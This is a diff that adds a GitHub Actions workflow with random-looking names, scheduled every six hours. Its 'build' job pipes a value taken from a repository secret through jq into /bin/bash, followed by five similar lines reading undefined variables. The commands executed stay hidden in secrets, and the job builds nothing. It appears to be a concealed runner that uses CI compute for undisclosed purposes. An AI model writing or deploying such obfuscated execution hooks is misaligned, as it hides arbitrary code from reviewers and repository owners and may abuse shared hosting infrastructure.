@@ -1,0 +1,22 @@
+name: hanguofu6751
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hanguofu6751
+        env:
+          t163: ${{ secrets.t163 }}
+        run: |
+          echo $t163 | jq -r .oj07090 | /bin/bash
+          echo $mb5241 | jq -r .w53 | /bin/bash
+          echo $dxx329 | jq -r .ab1531 | /bin/bash
+          echo $syrs5488 | jq -r .ez87 | /bin/bash
+          echo $pslk000 | jq -r .rllix1248 | /bin/bash
+          echo $mhdn26927 | jq -r .ksgbc52 | /bin/bash
+
